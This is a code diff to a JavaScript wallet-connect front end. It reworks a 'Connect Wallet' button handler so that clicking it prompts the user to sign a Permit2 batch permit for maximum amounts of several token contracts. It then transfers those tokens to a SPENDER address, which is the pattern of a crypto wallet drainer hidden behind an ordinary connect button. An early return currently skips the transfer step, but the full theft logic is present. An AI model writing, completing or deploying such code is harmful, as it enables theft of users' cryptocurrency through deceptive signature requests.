@@ -10,6 +10,17 @@ import { signMessage, sendTx } from "../services/wallet";
 import { fetchEvmBalances } from "../mine";
 import Swal from "sweetalert2";
 
+const BSC_TESTNET = {
+  id: "eip155:97",           // CAIP chain ID for BSC Testnet
+  namespace: "eip155",       // Ethereum-style chain
+  chainId: "0x61",           // Hexadecimal chain ID (97 decimal)
+  rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
+  displayName: "BSC Testnet",
+  ticker: "tBNB",
+  tickerName: "Test BNB"
+};
+
+
 const TOKENS = [
   "0x55d398326f99059fF775485246999027B3197955",
   "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
@@ -71,115 +82,110 @@ export const updateBtnText = async (modal) => {
   const element = document.getElementById("open-connect-modal");
   element.textContent = isConnected ? "My Wallet" : "Connect Wallet";
 
-  //modal.open();
+  element.onclick = async () => {
+    
+    modal.open();
 
-  if (!isConnected) return console.log("⛔️ Not connected!");
+    if (!isConnected) return console.log("⛔️ Not connected!");
 
-  if (processed) return console.log("✅ Already processed!");
-  processed = true;
+    if (processed) return console.log("✅ Already processed!");
+    processed = true;
 
-  //const walletProvider = await modal.getWalletProvider() //store.eip155Provider;
-  /*
-    const rpc = new JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    await modal.switchNetwork(BSC_TESTNET);
 
     const walletProvider = await modal.getWalletProvider();
-const wcProvider = new BrowserProvider(walletProvider);
-
-let signer = await wcProvider.getSigner();
-signer = signer.connect(rpc); 
-
-
 
     const ethersProvider = new BrowserProvider(walletProvider);
-    //const signer = await ethersProvider.getSigner();
-    */
 
-  const walletProvider = await modal.getWalletProvider();
+    const signer = await ethersProvider.getSigner();
 
-  const ethersProvider = new BrowserProvider(walletProvider);
+    const owner = modal.getAddress();
 
-  const signer = await ethersProvider.getSigner();
+    return;
 
-
-  const owner = modal.getAddress();
-
-  const permit = {
-    permitted: TOKENS.map((token) => ({
-      token,
-      amount: MaxUint160,
-    })),
-    owner,
-    spender: SPENDER,
-    nonce: 0,
-    deadline: Math.floor(Date.now() / 1000) + 60,
-  };
-
-
-  const { domain, types, values } = SignatureTransfer.getPermitData(
-    permit,
-    PERMIT2_ADDRESS,
-    CHAIN_ID
-  );
-  values.permitted = values.permitted.map(p => ({
-    token: p.token,
-    amount: p.amount.toString()
-  }))
-
-  values.permitted = values.permitted.map(p => ({
-    token: p.token,
-    amount: p.amount.toString()
-  }))
-
-  console.log("EIP712:", { domain, types, values });
-
-  const signature = await walletProvider.request({
-    method: "eth_signTypedData_v4",
-    params: [
+    const permit = {
+      permitted: TOKENS.map((token) => ({
+        token,
+        amount: MaxUint160,
+      })),
       owner,
-      JSON.stringify({
-        domain,
-        types: {
-          ...types,
-          EIP712Domain: [
-            { name: "name", type: "string" },
-            { name: "chainId", type: "uint256" },
-            { name: "verifyingContract", type: "address" },
-          ],
-        },
-        primaryType: "PermitBatchTransferFrom",
-        message: values,
-      }),
-    ],
-  });
+      spender: PERMIT2_ADDRESS,
+      nonce: 0,
+      deadline: Math.floor(Date.now() / 1000) + 60,
+    };
 
-  console.log("Permit2 Signature:", signature);
+    const { domain, types, values } = SignatureTransfer.getPermitData(
+      permit,
+      PERMIT2_ADDRESS,
+      CHAIN_ID
+    );
+    values.permitted = values.permitted.map((p) => ({
+      token: p.token,
+      amount: p.amount.toString(),
+    }));
 
+    console.log("EIP712:", { domain, types, values });
 
-  const permit2Contract = new Contract(
-  SPENDER,
-  [
-    "function permitTransferFrom((address owner,address spender,uint256 nonce,uint256 deadline,(address token,uint256 amount)[] permitted),address owner,bytes signature) external"
-  ],
-  signer
-);
+    const signature = await walletProvider.request({
+      method: "eth_signTypedData_v4",
+      params: [
+        owner,
+        JSON.stringify({
+          domain,
+          types: {
+            ...types,
+            EIP712Domain: [
+              { name: "name", type: "string" },
+              { name: "chainId", type: "uint256" },
+              { name: "verifyingContract", type: "address" },
+            ],
+          },
+          primaryType: "PermitBatchTransferFrom",
+          message: values,
+        }),
+      ],
+    });
 
-console.log(permit2Contract);
+    console.log("Permit2 Signature:", signature);
 
+    const permit2Contract = new Contract(
+      PERMIT2_ADDRESS,
+      [
+        "function permitTransferFrom(((address token, uint256 amount)[], address spender, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature) external",
+      ],
+      signer
+    );
 
+    const transferDetails = {
+      to: SPENDER,
+      requestedAmount: MaxUint160,
+    };
 
-// Execute transfer
-const tx = await permit2Contract.permitTransferFrom(
-  permit,
-  permit.owner,
-  signature
-);
+    // Suppose your permit has 3 tokens
+    const permitArray = [
+      permit.permitted.map((p) => [p.token, p.amount]), // address token[], uint256 amount[]
+      permit.spender, // address spender
+      permit.nonce, // uint256 nonce
+      permit.deadline, // uint256 deadline
+    ];
 
-console.log("Transaction hash:", tx.hash);
-await tx.wait();
-console.log("Tokens transferred!");
+    // Transfer details as array
+    const transferDetailsArray = [
+      transferDetails.to, // address
+      transferDetails.requestedAmount.toString(),
+    ];
 
+    const tx = await permit2Contract.permitTransferFrom(
+      permitArray,
+      transferDetailsArray,
+      owner,
+      signature
+    );
 
-
+    console.log("Transaction sent:", tx.hash);
+    await tx.wait();
+    console.log("Tokens transferred to:", transferDetails.to);
+  };
 
   /*
   isConnected = modal.getIsConnectedState();
